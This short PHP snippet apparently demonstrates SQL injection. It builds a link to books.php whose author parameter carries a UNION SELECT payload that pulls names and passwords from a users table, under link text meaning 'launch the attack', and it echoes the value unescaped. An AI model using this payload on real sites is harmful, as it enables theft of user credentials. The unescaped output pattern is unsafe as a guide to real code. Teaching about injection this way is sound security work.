<?php
    $author = "' UNION SELECT name, password, NULL FROM users;--";
?>
<a href="books.php?author=<?php echo $author; ?>">攻撃を仕掛ける</a>